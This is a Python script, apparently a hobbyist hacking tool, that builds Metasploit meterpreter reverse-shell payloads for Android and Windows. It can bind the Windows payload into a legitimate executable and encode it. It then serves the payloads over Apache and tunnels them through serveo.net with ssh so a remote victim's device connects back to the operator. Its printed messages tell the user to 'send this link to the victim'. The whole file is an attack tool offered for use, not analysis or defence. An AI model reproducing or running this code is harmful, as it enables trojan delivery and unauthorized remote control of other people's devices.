import os
import socket
print("""
███████╗██████╗ 
██╔════╝██╔══██╗
█████╗  ██████╔╝
██╔══╝  ██╔══██╗
██║     ██║  ██║
╚═╝     ╚═╝  ╚═╝PORT-FORWARDER 
It will automatically find your internal ip ,,, So You don't need to enter it manually,,you just need to enter 
a Random port to forward over Internet

USE YOUR MSF PAYLOAD OVER THE INTERNET by PORT FORWARDING WITHOUT
ROUTER OR VPN
             >>>>coded by FEBIN REV
 """)
print("""\033[1;30m 
[1] ANDROID PAYLOAD

[2] WINDOWS PAYLOAD

[3] OPEN PORT ALREADY CREATED PAYLOAD
""")
print("\033[1;36m ENTER THE CHOICE....")
payload_choice=int(input("FRportfwd>>># "))
if payload_choice==1:
	malware="android/meterpreter/reverse_tcp"
	ip=socket.gethostbyname(socket.gethostname())
	port=input("ENTER THE PORT TO FORWARD OVER WAN : ")
	path=input("enter the path to save your payload : ")	
	serv=socket.gethostbyname("serveo.net")
	name=input("ENTER THE NAME FOR YOUR PAYLOAD : ")
	print(f"GENERATING YOUR PAYLOAD APK  --->> {name}.apk ")
	os.system(f"msfvenom -p {malware} -a dalvik --platform=android lhost={serv} lport={port} > {path}/{name}.apk")
	print("SIGNING YOUR APK>>>>>>...")
	print("")
	os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {path}/{name}.apk")
	print("")
	print(f"{path}/{name}.apk  has been created successfully .......")
	link=input("DO YOU WANT TO SEND THE PAYLOAD VIA A LINK? (kali linux only) [Y/n] : ")
	if link=="y" or link=="Y":
		print("C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING AND SERVER..")
		print("")
		print("[1] custom domain   [2] default domain")
		domain=int(input("ENTER YOUR CHOICE : "))
		if domain==1:
			dn=input("Enter a name for subdomain :")
			print("SERVER AND PORT FORWARDING STARTED ctrl+c to STOP")
			os.system(f"cp {path}/{name}.apk /var/www/html/")
			os.system("service apache2 start") 
			print(f"send this link to the victim >>> {dn}.serveo.net/{name}.apk")
			os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  {dn}.serveo.net:80:localhost:80")
		else:
			print(f"using DEFAULT url > https://febrev.serveo.net/{name}.apk <<send this link to victim")
			os.system(f"cp {path}/{name}.apk /var/www/html/")
			os.system("service apache2 start") 
			print("SERVER AND PORT FORWARDING ENABLED.....")
			os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  febrev.serveo.net:80:localhost:80")
	else:
		print("PORT FORWARDING ENABLED>>>>>>>>>>")
		print("C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING")
		os.system(f"ssh -R {port}:{ip}:{port} serveo.net")

elif payload_choice==2:
	malware="windows/meterpreter/reverse_tcp"
	encoder="x86/shikata_ga_nai"
	plat="--platform=windows"
	ip=socket.gethostbyname(socket.gethostname())
	port=input("ENTER THE PORT TO FORWARD OVER WAN : ")
	path=input("enter the path to save your payload : ")	
	serv=socket.gethostbyname("serveo.net")
	name=input("ENTER THE NAME FOR YOUR PAYLOAD : ")
	bind=input("DO YO WANT TO BIND YOUR PAYLOAD WITH ORIGINAL EXE? [Y/n]:")
	if bind=="y" or bind=="Y":
		bex=input("Enter the path/exe file to bind : ")
		os.system(f"msfvenom -x {bex} -p {malware} -e {encoder} {plat} -f exe lhost={serv} lport={port} > {path}/{name}.exe")
		print(f"{path}/{name}.exe has been created successfully....")
	else:
		os.system(f"msfvenom -p {malware} -e {encoder} {plat} -f exe lhost={serv} lport={port} > {path}/{name}.exe")
		print("")
		print(f"{path}/{name}   has been successfully .......")
	link=input("DO YOU WANT TO SEND THE PAYLOAD VIA A LINK? [Y/n] : ")
	if link=="y" or link=="Y":
		print("C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING AND SERVER..")
		print("")
		os.system(f"cp {path}/{name}.exe /var/www/html/")
		os.system("service apache2 start") 
		print("[1] custom domain   [2] default domain")
		domain=int(input("ENTER YOUR CHOICE : "))
		if domain==1:
			dn=input("Enter a name for subdomain :")
			print("SERVER AND PORT FORWARDING STARTED ctrl+c to STOP")
			print(f"send this link to the victim >>> {dn}.serveo.net/{name}.exe")
			os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  {dn}.serveo.net:80:localhost:80")
		else:
			print(f"using DEFAULT url > https://febrev.serveo.net/{name}.exe <<send this link to victim")
			print("SERVER AND PORT FORWARDING ENABLED.....")
			os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  febrev.serveo.net:80:localhost:80")
	else:
		print("PORT FORWARDING ENABLED>>>>>>>>>>")
		print("C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING")
		os.system(f"ssh -R {port}:{ip}:{port} serveo.net")
elif payload_choice==3:
	port=input("ENTER THE PORT YOU USED IN THE PAYLOAD : ")
	print(f"\033[5;32m PORT FORWARDING STARTED ON PORT {port}.....")
	os.system(f"ssh -R {port}:loaclhost:{port} serveo.net > /dev/null") 
else:
	print("NO PROPER INPUT GIVEN ..... EXITING")























		
